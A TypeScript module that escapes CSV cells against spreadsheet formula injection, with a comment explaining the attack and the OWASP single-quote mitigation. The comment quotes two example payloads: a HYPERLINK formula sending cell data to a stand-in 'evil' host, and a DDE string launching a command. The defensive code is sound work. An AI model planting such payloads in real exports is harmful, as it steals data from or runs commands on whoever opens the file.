/**
 * CSV formula injection (CWE-1236).
 *
 * A cell whose text starts with =, +, - or @ is read as a formula by Excel, Google
 * Sheets and LibreOffice the moment the file is opened — quoting the cell does not
 * stop this, only escaping the quote character inside it does, which is a different
 * problem. Every CSV this app writes can carry values nobody who exports the file
 * typed themselves: an uploaded lead list, a webinar registrant's company field, a
 * scraped or enriched record. A row shaped like `=HYPERLINK("https://evil/x?"&A1)` or
 * a legacy `=cmd|' /c calc'!A1` DDE string sits inertly as text in this app and then
 * executes the moment whoever downloaded the "cleaned" export opens it in a
 * spreadsheet — three independent call sites built CSV rows with quote-escaping only
 * and no defense against this at all.
 *
 * The standard mitigation (OWASP's CSV Injection cheat sheet): prefix a leading
 * single quote. Every affected spreadsheet application then reads the cell as text,
 * and Excel hides the leading quote in the cell's own display.
 */
const FORMULA_TRIGGER = /^[=+\-@]/;

/** One CSV field, safe against both formula injection and structural breakout. */
export function csvCell(value: unknown): string {
  let s = String(value ?? "");
  if (FORMULA_TRIGGER.test(s)) s = `'${s}`;
  if (s.includes(",") || s.includes('"') || s.includes("\n") || s.includes("\r")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/** A full CSV row (no trailing newline) from raw cell values, in order. */
export function csvRow(values: unknown[]): string {
  return values.map(csvCell).join(",");
}
